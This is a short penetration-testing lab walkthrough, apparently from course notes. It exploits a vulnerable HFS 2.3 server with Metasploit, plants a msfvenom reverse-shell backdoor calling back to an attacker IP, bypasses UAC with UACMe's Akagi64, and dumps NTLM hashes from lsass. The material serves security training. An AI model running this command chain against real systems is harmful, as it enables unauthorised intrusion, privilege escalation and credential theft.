# UAC Bypass: UACMe

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2510–2570. Examples are lab-specific and need verification.

UAC: User Account Control

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable server will be accessible at **demo.ine.local**.

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module. And then, bypass UAC using the UACME tool.

**Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.

**Note:** The UACMe tool is located in **"/root/Desktop/tools/UACME/"** directory.

Tools: Nmap , msf, UACME

```bash

ping -c 4 demo.ine.local
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
//HTTP File Server (HFS) 2.3 is available.
searchsploit hfs

msfconsole -q

use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit

getuid
sysinfo
ps -S explorer.exe
migrate 2332
getsystem
shell
net localgroup administrators
//access denied administrator
//admin to NT auth need bypass UAC for admin with the help of UACMe tool

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
file backdoor.exe

CTRL + C
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls

msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit

shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
ps -S lsass.exe
migrate 496
hashdump
```
